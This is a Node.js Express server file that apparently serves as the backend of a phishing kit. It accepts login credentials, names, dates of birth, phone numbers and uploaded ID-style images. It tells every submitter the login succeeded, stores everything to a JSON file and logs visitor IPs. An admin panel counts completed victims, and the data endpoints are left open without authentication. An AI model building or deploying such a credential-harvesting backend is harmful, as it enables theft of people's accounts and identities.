const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Create uploads directory if it doesn't exist
const uploadsDir = path.join(__dirname, 'uploads');
if (!fs.existsSync(uploadsDir)) {
  fs.mkdirSync(uploadsDir, { recursive: true });
}

// Serve uploaded files
app.use('/uploads', express.static(uploadsDir));

// Configure multer for file uploads
const storage = multer.diskStorage({
  destination: (req, file, cb) => {
    cb(null, uploadsDir);
  },
  filename: (req, file, cb) => {
    const uniqueSuffix = Date.now() + '-' + Math.round(Math.random() * 1E9);
    cb(null, file.fieldname + '-' + uniqueSuffix + path.extname(file.originalname));
  }
});

const upload = multer({ 
  storage: storage,
  limits: {
    fileSize: 10 * 1024 * 1024 // 10MB limit
  },
  fileFilter: (req, file, cb) => {
    // Accept only image files
    if (file.mimetype.startsWith('image/')) {
      cb(null, true);
    } else {
      cb(new Error('Only image files are allowed!'), false);
    }
  }
});

// Data storage (in production, use a database)
let collectedData = [];
let siteVisitors = []; // Start with empty visitors array for clean tracking

// Load existing data from file on startup
const dataFile = path.join(__dirname, 'collected_data.json');
if (fs.existsSync(dataFile)) {
  try {
    const existingData = fs.readFileSync(dataFile, 'utf8');
    collectedData = JSON.parse(existingData);
    console.log(`Loaded ${collectedData.length} existing data entries`);
  } catch (error) {
    console.error('Error loading existing data:', error);
    collectedData = [];
  }
}

// Simple admin authentication (in production, use proper auth)
const ADMIN_PASSWORD = 'admin123'; // Simple password for demo

// Middleware to track site visitors
app.use((req, res, next) => {
  // Skip tracking for admin routes, API calls, and static files
  if (req.path.startsWith('/api/admin') || 
      req.path.startsWith('/api/health') || 
      req.path.startsWith('/api/track-visit') ||
      req.path.startsWith('/uploads') ||
      req.path.startsWith('/static') ||
      req.path.startsWith('/favicon')) {
    return next();
  }
  
  // Track visitor
  const visitor = {
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent'),
    timestamp: new Date().toISOString(),
    path: req.path,
    method: req.method
  };
  
  // Add to visitors array (keep only last 500 visitors)
  siteVisitors.push(visitor);
  if (siteVisitors.length > 500) {
    siteVisitors = siteVisitors.slice(-500);
  }
  
  next();
});

// Routes
app.post('/api/login', (req, res) => {
  const { xusr, xpss } = req.body;
  
  console.log('Login attempt:', { xusr, xpss });
  
  // Store login data
  collectedData.push({
    type: 'login',
    data: { xusr, xpss },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'Login successful' });
});

app.post('/api/info', (req, res) => {
  const { xname1, xname2, xdob, xtel } = req.body;
  
  console.log('Info submission:', { xname1, xname2, xdob, xtel });
  
  // Store info data
  collectedData.push({
    type: 'info',
    data: { xname1, xname2, xdob, xtel },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'Info submitted successfully' });
});

app.post('/api/upload', upload.single('file'), (req, res) => {
  const file = req.file;
  const formData = req.body;
  
  console.log('File upload request received');
  console.log('File object:', file);
  console.log('Form data:', formData);
  console.log('Request headers:', req.headers);
  
  console.log('File upload:', {
    filename: file ? file.filename : 'No file',
    originalName: file ? file.originalname : 'No file',
    size: file ? file.size : 0,
    formData
  });
  
  // Store upload data
  collectedData.push({
    type: 'upload',
    data: {
      filename: file ? file.filename : null,
      originalName: file ? file.originalname : null,
      size: file ? file.size : 0,
      ...formData
    },
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  res.json({ success: true, message: 'File uploaded successfully' });
});

app.post('/api/final', (req, res) => {
  const data = req.body;
  
  console.log('Final data submission:', data);
  
  // Store final data
  collectedData.push({
    type: 'final',
    data: data,
    timestamp: new Date().toISOString(),
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent')
  });
  
  // Save all collected data to file
  const dataFile = path.join(__dirname, 'collected_data.json');
  fs.writeFileSync(dataFile, JSON.stringify(collectedData, null, 2));
  
  res.json({ success: true, message: 'Data submitted successfully' });
});

// Get collected data (for monitoring)
app.get('/api/data', (req, res) => {
  res.json(collectedData);
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// Track website visits
app.post('/api/track-visit', (req, res) => {
  const visitor = {
    ip: req.ip || req.connection.remoteAddress,
    userAgent: req.get('User-Agent'),
    timestamp: new Date().toISOString(),
    path: req.body.path || '/',
    method: 'GET'
  };
  
  // Check for duplicate visits (same IP, path, and within 10 seconds)
  const now = new Date().getTime();
  const tenSecondsAgo = now - 10000;
  
  const isDuplicate = siteVisitors.some(existingVisitor => {
    const existingTime = new Date(existingVisitor.timestamp).getTime();
    return existingVisitor.ip === visitor.ip && 
           existingVisitor.path === visitor.path && 
           existingTime > tenSecondsAgo;
  });
  
  if (isDuplicate) {
    console.log('Duplicate visit ignored:', visitor.path, 'from', visitor.ip);
    return res.json({ success: true, message: 'Duplicate visit ignored' });
  }
  
  // Add to visitors array (keep only last 500 visitors for better performance)
  siteVisitors.push(visitor);
  if (siteVisitors.length > 500) {
    siteVisitors = siteVisitors.slice(-500);
  }
  
  console.log('✅ Website visit tracked:', visitor.path, 'from', visitor.ip);
  
  res.json({ success: true, message: 'Visit tracked' });
});

// Admin routes
app.post('/api/admin/login', (req, res) => {
  const { password } = req.body;
  
  if (password === ADMIN_PASSWORD) {
    res.json({ success: true, message: 'Admin login successful' });
  } else {
    res.status(401).json({ success: false, message: 'Invalid admin password' });
  }
});

app.get('/api/admin/user-data', (req, res) => {
  // Return all collected user data
  res.json({
    success: true,
    data: collectedData,
    total: collectedData.length
  });
});

app.get('/api/admin/visitors', (req, res) => {
  // Return site visitors data
  res.json({
    success: true,
    data: siteVisitors,
    total: siteVisitors.length
  });
});

app.get('/api/admin/stats', (req, res) => {
  // Group data by session (using IP + date as session identifier)
  const sessionGroups = {};
  
  collectedData.forEach(item => {
    const sessionKey = `${item.ip}-${item.timestamp.split('T')[0]}`;
    if (!sessionGroups[sessionKey]) {
      sessionGroups[sessionKey] = [];
    }
    sessionGroups[sessionKey].push(item);
  });
  
  // Count unique user sessions (sessions that have completed the process)
  const uniqueUserSessions = Object.values(sessionGroups).filter(session => 
    session.some(item => item.type === 'final' || item.type === 'upload')
  ).length;
  
  // Return basic statistics
  const stats = {
    totalUsers: uniqueUserSessions,
    totalLogins: collectedData.filter(item => item.type === 'login').length,
    totalVisitors: siteVisitors.length,
    uniqueIPs: [...new Set(siteVisitors.map(v => v.ip))].length,
    lastActivity: collectedData.length > 0 ? collectedData[collectedData.length - 1].timestamp : null
  };
  
  res.json({
    success: true,
    stats: stats
  });
});

app.delete('/api/admin/delete-data/:index', (req, res) => {
  const index = parseInt(req.params.index);
  
  if (isNaN(index) || index < 0 || index >= collectedData.length) {
    return res.status(400).json({ success: false, message: 'Invalid index' });
  }
  
  // Remove the item from the array
  const deletedItem = collectedData.splice(index, 1)[0];
  
  // Save updated data to file
  const dataFile = path.join(__dirname, 'collected_data.json');
  fs.writeFileSync(dataFile, JSON.stringify(collectedData, null, 2));
  
  console.log(`Deleted data entry at index ${index}:`, deletedItem);
  
  res.json({ success: true, message: 'Data deleted successfully' });
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Error:', error);
  res.status(500).json({ error: error.message });
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`API endpoints available at http://localhost:${PORT}/api`);
});
